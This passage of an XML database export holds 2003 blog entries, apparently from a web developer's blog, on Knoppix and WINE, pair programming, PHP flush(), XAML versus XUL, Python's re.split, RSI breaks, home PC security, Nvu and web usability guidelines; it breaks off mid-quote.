		<field name="title">Knoppix</field>
		<field name="slug">knoppix</field>
		<field name="body">&lt;p&gt;So, I finally tried &lt;a href=&quot;http://www.knoppix.org/&quot;&gt;Knoppix&lt;/a&gt; today. I'd heard a lot about it and was ready to be impressed, but it still took me by surprise. If you haven't heard of Knoppix, it's a full Linux distribution on a &lt;acronym title=&quot;Compact Disc&quot;&gt;CD&lt;/acronym&gt; that is designed to boot straight from the &lt;acronym title=&quot;Compact Disc&quot;&gt;CD&lt;/acronym&gt;, without you needing to install anything and without you having to worry about it modifying the contents of your hard drive.&lt;/p&gt;

&lt;p&gt;Getting it running was pretty simple. I had to change the boot order in my BIOS so that my &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt; would try booting from the &lt;acronym title=&quot;Compact Disc&quot;&gt;CD&lt;/acronym&gt; before the hard drive (not difficult at all: hit delete as the &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt; is booting up and the option for changing the boot order was pretty obvious, at least on my machine), then all it took was inserting the &lt;acronym title=&quot;Compact Disc&quot;&gt;CD&lt;/acronym&gt; and powering up the computer.&lt;/p&gt;

&lt;p&gt;Knoppix auto-detected &lt;em&gt;everything&lt;/em&gt; - from my graphics card and network (I guess it used &lt;acronym title=&quot;Dynamic Host Configuration Protocol&quot;&gt;DHCP&lt;/acronym&gt;) right up to the scroll wheel on my mouse. There was a moment of confusion when it came up with a 'boot?' prompt, but it turned out I just had to hit enter for it to start auto-detection (the prompt appeared to be for advanced users to specify additional options). After that, it booted straight in to an attractively set up version of &lt;acronym title=&quot;K Desktop Environment&quot;&gt;KDE&lt;/acronym&gt; 3. The ease with which it started up was the first pleasant surprise, but what really impressed me was the huge amount of software that came on that one &lt;acronym title=&quot;Compact Disc&quot;&gt;CD&lt;/acronym&gt;. As well as &lt;acronym title=&quot;K Desktop Environment&quot;&gt;KDE&lt;/acronym&gt;, Knoppix comes with the full Open Office and Mozilla application suites, all the usual Linux tools and editors, plenty of multimedia software, the &lt;acronym title=&quot;Gnu Image Manipulation Program&quot;&gt;GIMP&lt;/acronym&gt; (a photo editing program similar to Photoshop), even Python 2.3. Everything was available through the &lt;acronym title=&quot;K Desktop Environment&quot;&gt;KDE&lt;/acronym&gt; application menus, and everything Just Worked.&lt;/p&gt;

&lt;p&gt;The icing on the cake though was &lt;acronym title=&quot;Wine Is Not an Emulator&quot;&gt;WINE&lt;/acronym&gt;. &lt;acronym title=&quot;Wine Is Not an Emulator&quot;&gt;WINE&lt;/acronym&gt; is an emulation layer for Linux that allows you to run Windows applications. I had heard about it, but always been put off trying it because it sounded so complicated. Knoppix comes with &lt;acronym title=&quot;Wine Is Not an Emulator&quot;&gt;WINE&lt;/acronym&gt; already installed, so I figured there was nothing to lose by trying it out.&lt;/p&gt;

&lt;p&gt;&lt;samp&gt;wine notepad.exe&lt;/samp&gt;&lt;/p&gt;

&lt;p&gt;Windows notepad loaded up in a new, &lt;acronym title=&quot;K Desktop Environment&quot;&gt;KDE&lt;/acronym&gt; style window. Wow.&lt;/p&gt;

&lt;p&gt;Knoppix mounts your Windows hard drive (in my case as hda2) as read only, so you can play with your existing files without fear of damaging them. I browsed around my Program Files directory and tried to run &lt;acronym title=&quot;Wine Is Not an Emulator&quot;&gt;WINE&lt;/acronym&gt; on various applications. Several failed, including Internet Explorer (hardly essential software, but useful for testing). I don't know if this is because they do weird, screwed up things that &lt;acronym title=&quot;Wine Is Not an Emulator&quot;&gt;WINE&lt;/acronym&gt; doesn't yet know how to handle or if they were upset that they couldn't read the filesystem. Whatever the reason, I was blown away by the fact that any of it worked at all. When UltraEdit loaded under Linux I positively cackled.&lt;/p&gt;

&lt;p&gt;I've only made one venture in to Knoppix land so far, but it really was everything as good as people had said it was. If you have access to a &lt;acronym title=&quot;Compact Disc&quot;&gt;CD&lt;/acronym&gt; burner and a fast internet connection you owe it to yourself to try it out.&lt;/p&gt;</field>
		<field name="created">2003-10-23 02:40:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1240</field>
		<field name="title">Pair Programming</field>
		<field name="slug">pairProgramming</field>
		<field name="body">&lt;p&gt;I've spent a few hours over the last two days pair programming with &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;Adrian&lt;/a&gt;. We're working on a pretty huge project at the moment, and we've just started work on the coding phase, overlapping the design phase. I had tried pair programming a few times before with some success, but this time in particular the benefits of the approach were crystal clear. In total, we've defined 4 database tables, a number of functions and a simple class. Working separately we would almost certainly have created more lines of code. However...&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The code we have produced is free of bugs. That's a pretty bold claim to make, but every line has been extensively discussed, tested and looked over by two pairs of eyes.&lt;/li&gt;
  &lt;li&gt;The naming conventions for both the Python code and the SQL are consistent and well thought out. We're both happy with them, we both understand why the names have been chosen and we both know the naming style well enough to continue it throughout the project.&lt;/li&gt;
  &lt;li&gt;The coding style itself is ultra-clean and approved by both of us. We have a preference now for everything from quoting styles to whether or not a docstring should finish in a full-stop (it shouldn't). We also know enough to keep these standards going for the rest of the project.&lt;/li&gt;
  &lt;li&gt;We learnt stuff from each other. KDE shortcuts, new features in Python 2.3, neat ways of laying out SQL statements, Python functional programming idioms.&lt;/li&gt;
  &lt;li&gt;We started coding, or at least started discussing the code, at the time we had scheduled for the start. There was no procrastination.&lt;/li&gt;
  &lt;li&gt;At no point did either of us check our email or check any blogs. &lt;code class=&quot;psuedocode&quot;&gt;productivity++&lt;/code&gt;!&lt;/li&gt;
  &lt;li&gt;We both know the code that we have written inside out and back to front.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Altogether they have been highly productive and successful sessions. Our plan now is to pair program the system core, then work separately on the additional modules that don't have major dependencies on each other. There are only two of us developers working on the project so pair programming the whole thing isn't really practical, but the benefits of working together the core modules are obvious.&lt;/p&gt;

&lt;p&gt;One last thing: it was a lot of fun!&lt;/p&gt;</field>
		<field name="created">2003-10-23 04:11:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1241</field>
		<field name="title">Progressive page updates</field>
		<field name="slug">progressivePageUpdates</field>
		<field name="body">&lt;p&gt;Now &lt;em&gt;this&lt;/em&gt; is cool: &lt;a href=&quot;http://ben.milleare.com/archives/000210.html&quot;&gt;The joy of flush()&lt;/a&gt; shows how &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;code class=&quot;php&quot;&gt;flush()&lt;/code&gt; function can be used to send data to the browser before a page has finished rendering. Check out Ben's &lt;a href=&quot;http://ben.milleare.com/dev/flush.php&quot;&gt;demo page&lt;/a&gt; to see the trick in action.&lt;/p&gt;

&lt;p&gt;I've seen this in use on a few sites for progress indicators, but I'd never realised how easy it was to achieve in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;. The progress indicator trick is pretty neat - it generally works by having a progress indicator widget that can be modified by javascript, then flushing a &lt;code class=&quot;javascript&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; element with a call to the progress incrementing function whenever an operation in the server side code has been completed. I've seen it used for &lt;acronym title=&quot;Internet Relay Chat&quot;&gt;IRC&lt;/acronym&gt; style chat applications as well, but I've always been concerned about the server resources that must be tied up in serving multiple persistent connections at once.&lt;/p&gt;</field>
		<field name="created">2003-10-23 16:16:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1242</field>
		<field name="title">Microsoft's XUL</field>
		<field name="slug">microsoftsXUL</field>
		<field name="body">&lt;p&gt;According to &lt;a href=&quot;http://longhornblogs.com/rdawson/posts/496.aspx&quot; title=&quot;Why there hasn&amp;apos;t been development of IE&quot;&gt;this Microsoft blogger&lt;/a&gt; the reason IE development has seemed quiet of late is that they've been working hard on &lt;acronym title=&quot;XML Application Markup Language&quot;&gt;XAML&lt;/acronym&gt;, an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; Application Markup Language which &lt;q cite=&quot;http://longhornblogs.com/rdawson/posts/496.aspx&quot;&gt;is a way to create applications in the browser (or out for that matter) [...] It is basically an XML structure with CSS and JavaScript.  The CSS defines the appearance and the JavaScript dictates behavior.&lt;/q&gt;&lt;/p&gt;

&lt;p&gt;Sound familiar? It should do - that's exactly what &lt;acronym title=&quot;XML User interface Language&quot;&gt;XUL&lt;/acronym&gt; does. On the plus side, this completely validates the grossly under-appreciated importance of Mozilla's biggest secret. On the negative side, this looks set to represent the &lt;em&gt;ultimate&lt;/em&gt; browser lock-in - in a few years time when &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 7 comes as standard on new &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt;s I wouldn't be surprised to see the corporate software development world moving almost exclusively to this technology - after all, it's going to be extremely easy both to develop and to distribute and it will have all of the benefits of a web application without the downside of the restricted &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt;s offered by &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;.&lt;/p&gt;

&lt;p&gt;Of course, Microsoft might make it an open standard. But then I might win the lottery next week.&lt;/p&gt;

&lt;p&gt;I wonder if it will be possible to transform &lt;acronym title=&quot;XML Application Markup Language&quot;&gt;XAML&lt;/acronym&gt; in to &lt;acronym title=&quot;XML User interface Language&quot;&gt;XUL&lt;/acronym&gt; using &lt;acronym title=&quot;XML Stylesheet Language Transformations&quot;&gt;XSLT&lt;/acronym&gt;?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; It has been pointed out that the author of the above blog entry is not a Microsoft employee.&lt;/p&gt;</field>
		<field name="created">2003-10-24 15:59:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1243</field>
		<field name="title">The difference between POST and GET</field>
		<field name="slug">difference</field>
		<field name="body">&lt;p&gt;How important is the ability to tell the difference between data sent by POST and data sent by GET (i.e in the query string) when developing web applications? Some web frameworks (such as &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;) provide separate mechanisms for accessing POST and GET data. Others (such as Python's &lt;a href=&quot;http://www.python.org/doc/current/lib/module-cgi.html&quot;&gt;cgi module&lt;/a&gt;) provide a single interface to form information that doesn't distinguish between the two. I already have a strong opinion on this but I'm going to leave it open for discussion here for a bit before weighing in.&lt;/p&gt;</field>
		<field name="created">2003-10-25 03:49:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1244</field>
		<field name="title">XUL in Safari</field>
		<field name="slug">xulSafari</field>
		<field name="body">&lt;p&gt;Safari 1.1 is included with the new release of Mac OS X, Panther. From Dave Hyatt's list of &lt;a href=&quot;http://weblogs.mozillazine.org/hyatt/archives/2003_10.html#004249&quot; title=&quot;Safari 1.1&quot;&gt;Safari 1.1 features&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://weblogs.mozillazine.org/hyatt/archives/2003_10.html#004249&quot;&gt;&lt;p&gt;A complete implementation of the XUL box model. Safari on Panther supports the complete XUL box model, including horizontal and vertical boxes, the ability to flex, and the ability to reorder content and reverse content. If you're building canned content that you control using WebKit, you'll find a whole new range of layout possibilities at your disposal. Need to create dynamically sized headers and footers and flexible center content? The XUL box model can do that. Need to center an object within the viewport? The XUL box model can do that too.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;With Microsoft's alternative to &lt;acronym title=&quot;XML User interface Language&quot;&gt;XUL&lt;/acronym&gt; seemingly &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/24/microsoftsXUL&quot; title=&quot;Microsoft&amp;apos;s XUL&quot;&gt;a few years away&lt;/a&gt;, are Apple looking to beat them to it with an implementation that's compatible with Mozilla?&lt;/p&gt;</field>
		<field name="created">2003-10-26 01:20:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1245</field>
		<field name="title">Capturing the power of re.split</field>
		<field name="slug">reSplit</field>
		<field name="body">&lt;p&gt;A couple of Python tips. The first is really a tip for Mozilla/Firebird: You can set up a &lt;a href=&quot;http://www.mozilla.org/docs/end-user/keywords.html&quot;&gt;Custom Keyword&lt;/a&gt; for instantly accessing Python module documentation using the string &lt;samp&gt;www.python.org/doc/current/lib/module-%s.html&lt;/samp&gt; - I have this set up as &lt;samp&gt;pydoc&lt;/samp&gt;, so I can type &lt;samp&gt;pydoc re&lt;/samp&gt; to jump straight to the re module documentation. I only set it up half an hour ago and I've already used it about a dozen times.&lt;/p&gt;

&lt;p&gt;The second tip is so powerful I've been kicking myself for not finding out about it sooner. It relates to the regular expression module's &lt;code class=&quot;python&quot;&gt;re.split()&lt;/code&gt; function. Just like &lt;code&gt;string.split()&lt;/code&gt;, this lets you split up a string based on a certain token. With &lt;code class=&quot;python&quot;&gt;string.split()&lt;/code&gt; you the token you split on isn't included in the resulting array:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; 'pipe|separated|values'.split('|')
['pipe', 'separated', 'values']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is also true of &lt;code class=&quot;python&quot;&gt;re.split&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; splitter = re.compile('&amp;lt;.&amp;gt;')
&amp;gt;&amp;gt;&amp;gt; splitter.split('hi&amp;lt;a&amp;gt;there&amp;lt;b&amp;gt;from&amp;lt;c&amp;gt;python')
['hi', 'there', 'from', 'python']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here's the magic part though. If you put part or all of the regular expression in parenthesis the separating tokens get included in the resulting list:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; splitter = re.compile('(&amp;lt;.&amp;gt;)')
&amp;gt;&amp;gt;&amp;gt; splitter.split('hi&amp;lt;a&amp;gt;there&amp;lt;b&amp;gt;from&amp;lt;c&amp;gt;python')
['hi', '&amp;lt;a&amp;gt;', 'there', '&amp;lt;b&amp;gt;', 'from', '&amp;lt;c&amp;gt;', 'python']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Why is this a big deal? Because it suddenly makes writing simple parsers and tokenisers a whole heck of a lot easier. Using the above example, say you wanted to do something with each of the &lt;samp&gt;&amp;lt;?&amp;gt;&lt;/samp&gt; style tags. You can just iterate through the resulting list identifying each tag using the regular expression you've already compiled and then altering just those list items, before joining the whole list back together again at the end.&lt;/p&gt;

&lt;p&gt;Simple parsing and replacement of easily identified tags can already be achieved using the &lt;code class=&quot;python&quot;&gt;re.sub()&lt;/code&gt; method, which allows you to provide a callback function to process each matching token. The difference with using &lt;code class=&quot;python&quot;&gt;re.split()&lt;/code&gt; is that you can easily take in to account the &lt;em&gt;order&lt;/em&gt; of the tokens, allowing you to build systems that can use special tags to define areas of documents without getting confused by nesting tag sets. As a simple example, you could build a basic event based &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parser using just a couple of expressions. In fact, I discovered this technique while examining the source code for the &lt;a href=&quot;http://sourceforge.net/projects/tinpy/&quot;&gt;tinpy&lt;/a&gt; tiny python template module, which gives a clue to why I'm so interested in it.&lt;/p&gt;

&lt;p&gt;Having discovered this feature in Python, I just had to see if it existed in other languages as well. Unsurprisingly it does; &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;a href=&quot;http://www.php.net/preg_split&quot;&gt;preg_split&lt;/a&gt; offers an optional  &lt;code&gt;PREG_SPLIT_DELIM_CAPTURE&lt;/code&gt; flag (added in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 4.0.5) and Javascript has similar behaviour to Python, including the splitting token if it is wrapped in parentheses.&lt;/p&gt;

&lt;p&gt;I'm probably the last person to find out about this, but it's such a useful technique I felt I just had to share it with the world.&lt;/p&gt;</field>
		<field name="created">2003-10-26 03:01:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1246</field>
		<field name="title">Avoiding RSI</field>
		<field name="slug">avoidingRSI</field>
		<field name="body">&lt;p&gt;I'm pretty sure I've never had &lt;acronym title=&quot;Repetitive Strain Injury&quot;&gt;RSI&lt;/acronym&gt;, but occasionally my wrists feel a little sore after spending time at the keyboard and I know enough about it to know that I &lt;em&gt;really&lt;/em&gt; don't want it. This weekend I started using &lt;a href=&quot;http://www.workrave.com/welcome/index.php&quot;&gt;WorkRave&lt;/a&gt; after spotting a link to it on &lt;a href=&quot;http://blog.meriwilliams.com/archives/000017.html&quot; title=&quot;MeriBlog: Ergonomics&quot;&gt;Meri's blog&lt;/a&gt;. It's a neat little application for Linux and Windows that sits in the background and reminds you to take short breaks from the keyboard every once in a while. Following the suggestion from the &lt;a href=&quot;http://www.workrave.com/faq/&quot; title=&quot;WorkRave Frequently Asked Questions&quot;&gt;FAQ&lt;/a&gt; I have it set up to encourage a 15 second &quot;micropause&quot; every 10 minutes and a 5 minute proper rest break once an hour. It's too early to stay if I'll stick with it or get annoyed and turn it off, but I have to admit that I have been feeling a bit more comfortable at the keyboard. Whether that's purely a psychological effect from using it or the breaks are actually making a difference is hard to tell.&lt;/p&gt;</field>
		<field name="created">2003-10-27 05:13:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1247</field>
		<field name="title">Optimising Python</field>
		<field name="slug">optimisingPython</field>
		<field name="body">&lt;p&gt;Some great tips for optimising Python, courtesy of &lt;a href=&quot;http://blog.colorstudy.com/ianb/weblog/2003/10/26.html#P22&quot; title=&quot;Kata 19: an optimization anecdote&quot;&gt;Ian Bicking&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://blog.colorstudy.com/ianb/weblog/2003/10/26.html#P22&quot;&gt;Kata 19: an optimization anecdote&lt;/a&gt; demonstrates some neat techniques including use of the &lt;a href=&quot;http://www.python.org/doc/current/lib/module-gc.html&quot;&gt;gc module&lt;/a&gt; to fine tune garbage collection.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.python.org/doc/essays/list2str.html&quot;&gt;Python Patterns - An Optimization Anecdote&lt;/a&gt; mainly uses functional programming techniques and the &lt;a href=&quot;http://www.python.org/doc/current/lib/module-array.html&quot;&gt;array module&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://effbot.org/zone/image-histogram-optimization.htm&quot;&gt;An Optimization Anecdote&lt;/a&gt; from Fredrik Lundh teaches us that the more time is spent by Python in pure C routines, the faster code will run (note that this does not necessarily imply rewriting Python code in C).&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://manatee.mojam.com/~skip/python/fastpython.html&quot;&gt;Python Performance Tips&lt;/a&gt; from 1996, most of which look like they are still valid.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://trific.ath.cx/resources/python/optimization/&quot;&gt;Python optimization tips&lt;/a&gt;, which seem to be a bit more up to date.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-10-28 03:06:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1248</field>
		<field name="title">PCs for non-geeks</field>
		<field name="slug">nonGeeks</field>
		<field name="body">&lt;p&gt;A couple of interesting links about the security problems faced by the vast majority of the home &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt; using public, who don't know how to install security updates (or even what they are) and don't have a corporate IT department to bail them out when they run in to problems. &lt;a href=&quot;http://www.theregister.co.uk/content/56/33599.html&quot;&gt;Joe Average User Is In Trouble&lt;/a&gt; is a column by a security expert bemoaning the scale of the problem. &lt;a href=&quot;http://www.actsofvolition.com/archives/2003/october/doweallneeda&quot;&gt;Do we all need a personal system administrator?&lt;/a&gt; is a call for advice from Steve Garrity for tips on minimising the support calls he gets from his parents, and includes an excellent response from Matt Haughey in the comments.&lt;/p&gt;

&lt;p&gt;I've been called to a less-geeky friend's &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt; before to find it so infested with malware that it had slowed to a crawl. Most security breaches seem to come from Internet Explorer and Outlook Express, so Matt's advice to &lt;a href=&quot;http://www.actsofvolition.com/archives/2003/october/doweallneeda#reply7240&quot;&gt;replace them with Firebird and Thunderbird&lt;/a&gt; seems like a particularly good idea. Placing &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt;s behind a hardware router is a great idea as well as it at least prevents nasty traffic from the internet from probing the computer - although as Adam Kalsey &lt;a href=&quot;http://kalsey.com/2003/10/nat_is_not_a_firewall/&quot; title=&quot;NAT is not a firewall&quot;&gt;points out&lt;/a&gt; such a set up won't prevent malicious software that has already snuck its way on to a &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt; from calling home.&lt;/p&gt;</field>
		<field name="created">2003-10-29 05:17:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1249</field>
		<field name="title">Getting my stripes</field>
		<field name="slug">stripes</field>
		<field name="body">&lt;p&gt;Well colour me yellow and black, I've just become the latest member of the &lt;a href=&quot;http://webstandards.org/&quot;&gt;web standards project&lt;/a&gt;! I've been an avid supporter of the web standards movement for over a year now - in fact, my &lt;a href=&quot;http://simon.incutio.com/archive/2002/06/12/#webStandards&quot; title=&quot;WaSP Phase II&quot;&gt;first ever entry&lt;/a&gt; linked to their launch of Phase II. It's a great honour to be a part of something I've supported for so long and I hope to become heavily involved in the &lt;a href=&quot;http://www.webstandards.org/learn/&quot;&gt;Learn campaign&lt;/a&gt;, which aims to provide resources to developers who want to learn to use web standards effectively. I'm joining a &lt;a href=&quot;http://www.webstandards.org/about/bios/&quot;&gt;truly talented team&lt;/a&gt; and I look forward to helping encourage web professionals to adopt standards and make the web a more interoperable place.&lt;/p&gt;</field>
		<field name="created">2003-10-29 19:02:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1250</field>
		<field name="title">Defeating browser incompatibilities</field>
		<field name="slug">quirksMode</field>
		<field name="body">&lt;p&gt;Peter-Paul Koch has unveiled his new site, &lt;a href=&quot;http://www.quirksmode.org/&quot;&gt;QuirksMode.org&lt;/a&gt;, which features over 150 pages of cross browser &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and javascript tips and tricks. Five months in the making, there's just too much good stuff to link to individual pieces here so my best recommendation is to head on over there and spend some time browsing around. I'll make an exception though in linking to the &lt;a href=&quot;http://www.quirksmode.org/dom/toc.html&quot;&gt;Table of Contents script&lt;/a&gt;, which uses the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; to create an additional navigation bar linking to each of the level 2 and 3 headers on a page. Another great example of the power of structural markup.&lt;/p&gt;</field>
		<field name="created">2003-10-29 20:03:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1251</field>
		<field name="title">Nvu</field>
		<field name="slug">nvu</field>
		<field name="body">&lt;p&gt;Launched today by &lt;a href=&quot;http://www.lindows.com/&quot;&gt;Lindows&lt;/a&gt;, &lt;a href=&quot;http://www.nvu.com/&quot;&gt;Nvu&lt;/a&gt; is a new project to develop a complete &quot;web authoring system&quot; (aka Dreamweaver/Frontpage style &lt;acronym title=&quot;What You See Is What You Get&quot;&gt;WYSIWYG&lt;/acronym&gt; editor) for the Linux platform. Reading around the marketing hyperbole, What it actually &lt;em&gt;is&lt;/em&gt; is a standalone version of Mozilla's Composer with a whole bunch of improvements and extra features, scheduled for release in early 2004.&lt;/p&gt;

&lt;p&gt;The really good news is that Lindows have hired &lt;a href=&quot;http://webperso.easyconnect.fr/danielglazman/weblog/newarchive/2003_10_26_glazblogarc.html#s106745691981265156&quot; title=&quot;More news about Lindows.com and Composer&quot;&gt;Daniel Glazman&lt;/a&gt; to work on the project full time. Daniel is the principle maintainer of Mozilla Composer and it's great to see his work being funded in this way. Improvements to Composer made for Nvu seem certain to make it back in to the main Mozilla trunk.&lt;/p&gt;

&lt;p&gt;The not-so-good news is that the Nvu site and &lt;a href=&quot;http://www.nvu.com/faq.html&quot;&gt;FAQ&lt;/a&gt; make no mention of a Windows version of the software. Since development is being sponsored by Lindows this shouldn't come as a surprise, but it is disappointing because the great strength of the Mozilla framework is that it supports cross-platform development.&lt;/p&gt;

&lt;p&gt;It's also going to be interesting to see how this pans out from a web standards point of view. On the one hand, Daniel is certainly on the side of web standards. On the other hand, the current Nvu site's markup seems to come right out of 1998. I very much doubt it was created with the tool it promotes but it doesn't give off a particularly reassuring message. A free &lt;acronym title=&quot;What You See Is What You Get&quot;&gt;WYSIWYG&lt;/acronym&gt; &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; editor with strong standards support out of the box would be a valuable tool in helping authors create standards compliant sites. As it is, Dreamweaver is getting close but Dreamweaver also costs nearly $400.&lt;/p&gt;

&lt;p&gt;Wild conjecturing apart, the most interesting thing about Nvu (the name's pretty terrible but at least they got a three letter domain name) may well be the features that are added to the current Composer code base. The &lt;a href=&quot;http://www.nvu.com/screenshots.html&quot;&gt;screenshots&lt;/a&gt; already hint at intelligent FTP publishing support; what would be &lt;em&gt;really&lt;/em&gt; interesting would be the integration of a simple templating system and/or client side &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; capabilities - something like a cross between Fog Creek's &lt;a href=&quot;http://www.fogcreek.com/CityDesk/&quot;&gt;CityDesk&lt;/a&gt; and Macromedia's &lt;a href=&quot;http://www.macromedia.com/software/contribute/&quot;&gt;Contribute&lt;/a&gt;. Interested developers are invited to &lt;a href=&quot;http://www.nvu.com/developers.php&quot;&gt;sign up for a mailing list&lt;/a&gt; for notification of when the first development builds are made available. This is going to be an interesting project to watch.&lt;/p&gt;</field>
		<field name="created">2003-10-30 04:46:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1252</field>
		<field name="title">Shooting yourself in the foot</field>
		<field name="slug">shootingYourself</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.xmldatabases.org/WK/blog/651?t=item&quot; title=&quot;DRM sucks&quot;&gt;Kimbro Staken&lt;/a&gt; on &lt;acronym title=&quot;Digital Rights Management&quot;&gt;DRM&lt;/acronym&gt;: &lt;q cite=&quot;http://www.xmldatabases.org/WK/blog/651?t=item&quot;&gt;The record companies can be proud that they've so thoroughly screwed things up that there really isn't even any point in paying for music now.&lt;/q&gt;&lt;/p&gt;</field>
		<field name="created">2003-10-30 04:49:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1253</field>
		<field name="title">Halloween Decorations</field>
		<field name="slug">halloween</field>
		<field name="body">&lt;p&gt;Spotted so far:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.ljworld.com/site/halloween03/&quot;&gt;Lawrence Journal-World&lt;/a&gt; (where I work) - check out the funky blinking red eyes&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.google.com/&quot;&gt;Google&lt;/a&gt; - naturally&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.radiac.net/&quot;&gt;Radiac.net&lt;/a&gt; - &quot;Randy Towers&quot; ;)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.intertwingly.net/&quot;&gt;Sam Ruby&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Quite a poor showing really. I was going to add a bat to my top right hand corner but Halloween is already over in the &lt;acronym title=&quot;United Kingdom&quot;&gt;UK&lt;/acronym&gt; so it didn't seem worth it.&lt;/p&gt;</field>
		<field name="created">2003-11-01 02:12:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1254</field>
		<field name="title">That G5 Cluster</field>
		<field name="slug">g5Cluster</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.macdevcenter.com/pub/a/mac/2003/10/29/osxcon_g5cluster.html&quot;&gt;Confessions of the World's Largest Switcher&lt;/a&gt; is the best coverage I've seen to date of Virginia Tech's 1,100 Dual G5 Mac cluster, now the third fastest supercomputer in the world and built for a fraction of the price of its rivals. &lt;a href=&quot;http://www.wired.com/news/mac/0,2125,61005,00.html&quot;&gt;Mac Supercomputer Just Got Faster&lt;/a&gt; on Wired has some more information.&lt;/p&gt;</field>
		<field name="created">2003-11-02 05:06:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1255</field>
		<field name="title">Web design and usability guidelines</field>
		<field name="slug">usabilityGuidelines</field>
		<field name="body">&lt;p&gt;Usability.gov's &lt;a href=&quot;http://usability.gov/pdfs/guidelines.html&quot;&gt;Research-Based Web Design &amp;amp; Usability Guidelines&lt;/a&gt; lose instant credibility for being available only as a 39.2 &lt;acronym title=&quot;MegaBytes&quot;&gt;MB&lt;/acronym&gt; &lt;acronym title=&quot;Portable Document Format&quot;&gt;PDF&lt;/acronym&gt; file [ &lt;strong&gt;Update:&lt;/strong&gt; this statement is incorrect - see &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/06/oops&quot; title=&quot;Usability guidelines available online after all&quot;&gt;my correction&lt;/a&gt; ], with all of the usability and accessibility problems that brings with it. I'm on a fast connection here so I downloaded them anyway to have a look. There's actually a lot of good things I can say about them - the document is attractively laid out, the guidelines clear and easy to follow and each is backed up by references to academic research (hence the title). There are however some guidelines with which I completely disagree, in particular the ones in chapter 4, entitled &quot;Hardware and Software&quot;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://usability.gov/pdfs/chapter4.pdf&quot;&gt;
